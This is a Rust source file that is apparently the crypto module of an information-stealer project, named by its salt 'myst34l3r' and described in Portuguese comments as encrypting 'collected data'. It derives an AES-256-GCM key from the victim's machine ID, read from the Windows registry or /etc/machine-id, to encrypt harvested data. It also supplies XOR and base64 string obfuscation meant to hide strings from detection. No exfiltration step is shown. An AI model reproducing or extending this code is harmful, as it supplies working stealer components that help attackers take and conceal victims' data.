//! Crypto module - AES-256-GCM + XOR obfuscation

pub mod aes;

use thiserror::Error;
use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Nonce,
};
use argon2::Argon2;
use rand::RngCore;

#[derive(Error, Debug)]
pub enum CryptoError {
    #[error("encryption failed: {0}")]
    EncryptionFailed(String),
    
    #[error("decryption failed: {0}")]
    #[allow(dead_code)]
    DecryptionFailed(String),
    
    #[error("invalid key")]
    InvalidKey,
    
    #[error("corrupted data")]
    #[allow(dead_code)]
    CorruptedData,
    
    #[error("io error: {0}")]
    IoError(#[from] std::io::Error),
}

/// Gerencia criptografia dos dados coletados
pub struct CryptoManager {
    key: [u8; 32],
}

impl CryptoManager {
    /// Deriva chave do machine-id + salt
    pub fn new() -> Result<Self, CryptoError> {
        let machine_id = Self::get_machine_id()?;
        let salt = b"myst34l3r_s4lt_v1";
        let key = Self::derive_key(&machine_id, salt)?;
        Ok(Self { key })
    }
    
    #[allow(dead_code)]
    pub fn with_key(key: [u8; 32]) -> Self {
        Self { key }
    }
    
    /// AES-256-GCM encrypt
    /// Format: version(1) || nonce(12) || ciphertext
    pub fn encrypt(&self, data: &[u8]) -> Result<Vec<u8>, CryptoError> {
        let cipher = Aes256Gcm::new_from_slice(&self.key)
            .map_err(|_| CryptoError::InvalidKey)?;
        
        let mut nonce_bytes = [0u8; 12];
        rand::thread_rng().fill_bytes(&mut nonce_bytes);
        let nonce = Nonce::from_slice(&nonce_bytes);
        
        let ct = cipher.encrypt(nonce, data)
            .map_err(|e| CryptoError::EncryptionFailed(e.to_string()))?;
        
        let mut out = Vec::with_capacity(1 + 12 + ct.len());
        out.push(0x01); // v1
        out.extend_from_slice(&nonce_bytes);
        out.extend(ct);
        
        Ok(out)
    }
    
    /// AES-256-GCM decrypt
    #[allow(dead_code)]
    pub fn decrypt(&self, data: &[u8]) -> Result<Vec<u8>, CryptoError> {
        if data.len() < 14 {
            return Err(CryptoError::CorruptedData);
        }
        
        if data[0] != 0x01 {
            return Err(CryptoError::CorruptedData);
        }
        
        let cipher = Aes256Gcm::new_from_slice(&self.key)
            .map_err(|_| CryptoError::InvalidKey)?;
        
        let nonce = Nonce::from_slice(&data[1..13]);
        
        cipher.decrypt(nonce, &data[13..])
            .map_err(|e| CryptoError::DecryptionFailed(e.to_string()))
    }
    
    fn derive_key(pass: &str, salt: &[u8]) -> Result<[u8; 32], CryptoError> {
        let mut key = [0u8; 32];
        Argon2::default()
            .hash_password_into(pass.as_bytes(), salt, &mut key)
            .map_err(|e| CryptoError::EncryptionFailed(e.to_string()))?;
        Ok(key)
    }
    
    #[cfg(windows)]
    fn get_machine_id() -> Result<String, CryptoError> {
        use std::process::Command;
        
        // Query MachineGuid from registry
        let out = Command::new("reg")
            .args(["query", r"HKLM\SOFTWARE\Microsoft\Cryptography", "/v", "MachineGuid"])
            .output()?;
        
        if out.status.success() {
            let txt = String::from_utf8_lossy(&out.stdout);
            for line in txt.lines() {
                if line.contains("MachineGuid") {
                    if let Some(guid) = line.split_whitespace().last() {
                        return Ok(guid.to_string());
                    }
                }
            }
        }
        
        // fallback
        let host = whoami::fallible::hostname().unwrap_or_else(|_| "unk".into());
        Ok(format!("{}-{}", host, whoami::username()))
    }
    
    #[cfg(unix)]
    fn get_machine_id() -> Result<String, CryptoError> {
        // /etc/machine-id ou /var/lib/dbus/machine-id
        if let Ok(id) = std::fs::read_to_string("/etc/machine-id") {
            return Ok(id.trim().to_string());
        }
        if let Ok(id) = std::fs::read_to_string("/var/lib/dbus/machine-id") {
            return Ok(id.trim().to_string());
        }
        
        let host = whoami::fallible::hostname().unwrap_or_else(|_| "unk".into());
        Ok(format!("{}-{}", host, whoami::username()))
    }
}

/// XOR-based string obfuscation (runtime deobfuscation)
pub mod obfuscation {
    /// XOR com key rotativo
    pub fn xor_encode(data: &[u8], key: &[u8]) -> Vec<u8> {
        data.iter()
            .enumerate()
            .map(|(i, b)| b ^ key[i % key.len()])
            .collect()
    }
    
    pub fn xor_decode(data: &[u8], key: &[u8]) -> Vec<u8> {
        xor_encode(data, key) // XOR é reversível
    }
    
    /// Ofusca string em compile time (simula litcrypt)
    #[macro_export]
    macro_rules! obf_str {
        ($s:expr) => {{
            const KEY: u8 = 0x42;
            $s.bytes().map(|b| b ^ KEY).collect::<Vec<u8>>()
        }};
    }
    
    pub fn b64_encode(data: &[u8]) -> String {
        use base64::Engine;
        base64::engine::general_purpose::STANDARD.encode(data)
    }
    
    #[allow(dead_code)]
    pub fn b64_decode(s: &str) -> Result<Vec<u8>, base64::DecodeError> {
        use base64::Engine;
        base64::engine::general_purpose::STANDARD.decode(s)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_roundtrip() {
        let cm = CryptoManager::with_key([0x41; 32]);
        let pt = b"test data 123";
        let ct = cm.encrypt(pt).unwrap();
        let dec = cm.decrypt(&ct).unwrap();
        assert_eq!(pt.as_slice(), dec.as_slice());
    }
    
    #[test]
    fn test_xor() {
        use obfuscation::*;
        let key = b"secretkey";
        let data = b"hello world";
        let enc = xor_encode(data, key);
        let dec = xor_decode(&enc, key);
        assert_eq!(data.as_slice(), dec.as_slice());
    }
}
